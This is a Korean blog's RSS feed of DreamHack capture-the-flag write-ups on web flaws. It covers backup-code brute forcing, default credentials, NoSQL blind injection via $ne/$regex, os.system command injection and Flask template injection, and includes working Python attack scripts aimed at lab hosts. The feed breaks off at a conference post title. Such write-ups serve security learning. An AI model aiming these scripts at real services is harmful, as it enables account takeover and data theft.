<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://dalnaracrater.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://dalnaracrater.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-12-07T15:27:29+00:00</updated><id>https://dalnaracrater.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">(DreamHack) login-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/" rel="alternate" type="text/html" title="(DreamHack) login-1"/><published>2021-06-01T09:24:00+00:00</published><updated>2021-06-01T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/"><![CDATA[<h2 id="풀이">풀이</h2> <p>플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">userLevel</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">0</span> <span class="p">:</span> <span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span>
    <span class="mi">1</span> <span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span>
<span class="p">}</span>
<span class="n">MAXRESETCOUNT</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">level</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">userLevel</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
        <span class="k">return</span> <span class="n">FLAG</span>

    <span class="k">return</span> <span class="sh">"</span><span class="s">Only Admin !</span><span class="sh">"</span>
</code></pre></div></div> <p>userid를 클릭하면 아래와 같은 화면이 나온다. 이때 url에 있는 17이란 숫자가 user에 부여되는 특정 id라고 가정하여 해당 숫자를 변경해 보았다. <img src="https://user-images.githubusercontent.com/24788751/120293279-0cf91980-c300-11eb-9c7f-aa502b0a3816.png" alt="image"/></p> <p>이때 potato라는 사용자의 유저 레벨이 1인 것을 확인하였다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120293014-cf948c00-c2ff-11eb-9c89-ab0a6e23ffae.PNG" alt="admin1"/></p> <p>비밀번호 찾기를 통해 비밀번호를 수정하도록 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">makeBackupcode</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/forgot_password</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">forgot.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">newpassword</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">newpassword</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">backupCode</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">backupCode</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>

        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT * FROM user WHERE id = ?</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">userid</span><span class="p">,)).</span><span class="nf">fetchone</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
            <span class="c1"># security for brute force Attack.
</span>            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAXRESETCOUNT</span><span class="p">:</span>
                <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">reset Count Exceed.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span>
            
            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">backupCode</span><span class="p">:</span>
                <span class="n">newbackupCode</span> <span class="o">=</span> <span class="nf">makeBackupcode</span><span class="p">()</span>
                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?</span><span class="sh">"</span>
                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">newpassword</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="n">newbackupCode</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;b&gt;Password Change Success.&lt;/b&gt;&lt;br/&gt;New BackupCode : </span><span class="si">{</span><span class="n">newbackupCode</span><span class="si">}</span><span class="sh">"</span>

            <span class="k">else</span><span class="p">:</span>
                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set resetCount = resetCount+1 where idx = ?</span><span class="sh">"</span>
                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Wrong BackupCode !&lt;br/&gt;&lt;b&gt;Left Count : &lt;/b&gt; </span><span class="si">{</span><span class="p">(</span><span class="n">MAXRESETCOUNT</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
            
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">index.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>

        <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">User Not Found.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span><span class="p">;</span>
</code></pre></div></div> <p>백업 코드는 0이상 100미만의 수가 생성되기 때문에 브루트포스 방식을 통해 백업코드를 찾고 원하는 비밀번호로 변경할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">u</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://host1.dreamhack.games:17892/forgot_password</span><span class="sh">"</span>
<span class="n">userid</span> <span class="o">=</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span> <span class="sh">'</span><span class="s">newpassword</span><span class="sh">'</span><span class="p">:</span><span class="sh">"</span><span class="s">aaa</span><span class="sh">"</span><span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sh">"</span><span class="s"> was backup code</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span> <span class="c1"># 500
</span>        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[풀이 플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.]]></summary></entry><entry><title type="html">(DreamHack) web-misconf-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/" rel="alternate" type="text/html" title="(DreamHack) web-misconf-1"/><published>2021-06-01T09:24:00+00:00</published><updated>2021-06-01T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/"><![CDATA[<p>네트워크 장비, CCTV 등 여러 전자제품은 구매를 하면 초기 비밀번호가 설정되어 있다. 그런데 구입 후 이를 변경해주지 않으면 이를 악용할 수 있는 가능성이 존재한다. 해당 문제도 비슷한 시각에서 출제된 문제라고 생각한다.</p> <h2 id="풀이">풀이</h2> <p>접속하면 다음과 같은 화면이 출력된다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120296923-91996700-c303-11eb-8b0b-61b4b4fb4fd8.png" alt="image"/></p> <p>회원가입 기능이 따로 없어 admin/admin으로 로그인 시도를 해보았는데 성공하였다.</p> <p>문제에서 flag가 Organization에 있다고 했으므로 설정을 확인하여 플래그를 찾을 수 있었다.</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[web-misconf]]></summary></entry><entry><title type="html">(DreamHack) Mango</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/" rel="alternate" type="text/html" title="(DreamHack) Mango"/><published>2021-05-25T09:24:00+00:00</published><updated>2021-05-25T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/"><![CDATA[<p>NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.</p> <p>Mongo db는 대표적인 NoSQL이며, 비교 연산자, 논리 연산자를 기본적으로 사용할 수 있고, $regex, $where, $elemMatch 연산자를 통해 좀 더 다양한 기능을 수행할 수 있다.</p> <h2 id="풀이">풀이</h2> <p>BAN 변수에는 ‘admin’, ‘dh’, ‘admi’의 문자열이 포함되게 되면 필터링하게 되어있다. 따라서 필터링 되지 않도록 $ne guest를 사용하여 admin을 검색할 수 있도록 하였다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}</span>
<span class="kd">const</span> <span class="nx">BAN</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">dh</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admi</span><span class="dl">'</span><span class="p">];</span>

<span class="nx">filter</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
    <span class="kd">const</span> <span class="nx">dump</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nx">BAN</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">word</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">dump</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">word</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nx">flag</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">)){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">filter</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">const</span> <span class="p">{</span><span class="nx">uid</span><span class="p">,</span> <span class="nx">upw</span><span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>

    <span class="nx">db</span><span class="p">.</span><span class="nf">collection</span><span class="p">(</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">).</span><span class="nf">findOne</span><span class="p">({</span>
        <span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">:</span> <span class="nx">uid</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">upw</span><span class="dl">'</span><span class="p">:</span> <span class="nx">upw</span><span class="p">,</span>
    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">){</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">err</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">]);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="p">});</span>
</code></pre></div></div> <p>BAN에 dh가 있기 때문에 이를 피하기 위해 [D]를 사용했으며, brute force방식과 유사하게 모든 경우의 수를 탐색할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="nb">ascii</span> <span class="o">=</span><span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">url</span><span class="p">(</span><span class="n">pwd</span><span class="p">):</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">uid[$ne]</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">upw[$regex]</span><span class="sh">'</span><span class="p">:</span><span class="n">pwd</span><span class="p">}</span> <span class="c1">#uid=[adm]in 등으로 해주어도 된다.
</span>    <span class="n">port</span> <span class="o">=</span> <span class="mi">15108</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://host1.dreamhack.games:</span><span class="sh">'</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span><span class="n">params</span> <span class="o">=</span> <span class="n">params</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="k">global</span> <span class="nb">ascii</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">ascii</span><span class="p">:</span>
        <span class="n">ch</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">in</span> <span class="nf">url</span><span class="p">(</span><span class="n">ch</span><span class="p">).</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">i</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[D]H{</span><span class="sh">'</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <h3 id="reference">Reference</h3> <p>[1] dreamhack. (2020).”Server-side Advanced - NoSQL.” Retrieved from https://dreamhack.io/learn/1/29#7</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.]]></summary></entry><entry><title type="html">(DreamHack) blind-command</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command/" rel="alternate" type="text/html" title="(DreamHack) blind-command"/><published>2021-04-06T09:24:00+00:00</published><updated>2021-04-06T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command/"><![CDATA[<p>Blind command injection은 입력 값을 통해 os의 명령어를 실행시키는 취약점이다. 보통은 입력 값을 검증하고 (‘;’, ‘#’과 같은 값 포함 여부 검증), 사용자 계정 권한 설정을 통해 예방할 수 있다. 특히 root 권한은 부여하지 않도록 주의한다.</p> <h2 id="풀이">풀이</h2> <p>주어진 소스코드 에서는 GET 메소드를 통해 요청을 받으면 아무런 동작을 하지 않은 뒤 cmd를 반환한다. 그러나 GET 메소드가 아닌 경우에는 cmd에서 지정한 시스템 함수를 호출할 수 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">cmd</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">?cmd=[cmd]</span><span class="sh">"</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="sh">''</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cmd</span>

<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
</code></pre></div></div> <p>먼저 로컬 호스트에서 HEAD 메소드를 사용하여 <code class="language-plaintext highlighter-rouge">host:port?cmd=dir</code>을 요청하게 되면 app.py 파일이 존재하는 디렉토리의 파일들을 출력하는 것을 콘솔창에서 확인할 수 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/113688584-6845cb80-9704-11eb-8938-3c095897e2fa.PNG" alt="ctf2-1"/></p> <p>그러나 주어진 컨테이너에서 플래그 값을 호출하지 못하였다. (어떻게 하는지 알려주세요ㅜㅜ)</p> <h3 id="http-메소드">HTTP 메소드</h3> <table> <thead> <tr> <th>name</th> <th>description</th> </tr> </thead> <tbody> <tr> <td>GET</td> <td>자료를 요청함</td> </tr> <tr> <td>HEAD</td> <td>GET 메소드 요청과 동일한 응답을 요구, body를 포함하지 않음</td> </tr> </tbody> </table> <h3 id="reference">Reference</h3> <p>[1] Heino Sass Hallik. (2020). “How to Prevent Blind Command Injection.” Retrieved from https://www.rangeforce.com/blog/how-to-prevent-blind-command-injection [2] MDN. (2021). “HTTP request methods.” Retrived from https://developer.mozilla.org/ko/docs/Web/HTTP/Methods</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[Blind command injection은 입력 값을 통해 os의 명령어를 실행시키는 취약점이다. 보통은 입력 값을 검증하고 (‘;’, ‘#’과 같은 값 포함 여부 검증), 사용자 계정 권한 설정을 통해 예방할 수 있다. 특히 root 권한은 부여하지 않도록 주의한다.]]></summary></entry><entry><title type="html">(DreamHack) simple-ssti</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti/" rel="alternate" type="text/html" title="(DreamHack) simple-ssti"/><published>2021-04-06T09:24:00+00:00</published><updated>2021-04-06T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti/"><![CDATA[<p>SSTI (Server Side Template Injection) 취약점은 동적으로 생성되는 웹페이지의 특성으로 인해 발생하는 취약점으로써 템플릿에 RCE (Remote Code Execution)가 존재할 경우 발생되는 취약점이다.</p> <h2 id="풀이">풀이</h2> <p>flag.txt에 저장된 값은 FLAG와 app.secret_key에 저장된다. 그러나 FLAG는 전역변수가 아니기 때문에 Error404 메소드에서 사용할 수 없다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>

<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">FLAG</span>
</code></pre></div></div> <p>그러나 flask는 Flask 객체의 config 속성에 애플리케이션의 실행 환경에 대한 설정 값을 저장한다. 그렇기 때문에 FLAG 값 또한 config에 설정이 되어 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">Error404</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    &lt;div class=</span><span class="sh">"</span><span class="s">center</span><span class="sh">"</span><span class="s">&gt;
        &lt;h1&gt;Page Not Found.&lt;/h1&gt;
        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">),</span> <span class="mi">404</span>

<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">%s</code>를 통해 ssti 취약점이 발생될 수 있다. 따라서 config를 출력하도록 <code class="language-plaintext highlighter-rouge">host:port/</code>를 요청하면 다음과 같이 플래그 값을 얻을 수 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/113693098-35520680-9709-11eb-94b1-eb0910fc6c2f.png" alt="image"/></p> <h3 id="reference">Reference</h3> <p>[1] Armin Ronacher. (2012).”설정 다루기.” Retrieved from https://flask-docs-kr.readthedocs.io/ko/latest/config.html</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[SSTI (Server Side Template Injection) 취약점은 동적으로 생성되는 웹페이지의 특성으로 인해 발생하는 취약점으로써 템플릿에 RCE (Remote Code Execution)가 존재할 경우 발생되는 취약점이다.]]></summary></entry><entry><title type="html">SDS Cyber Security Conference 2021 후기</title><link href="https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference/" rel="alternate" type="text/html" title="SDS Cyber Security Conference 2021 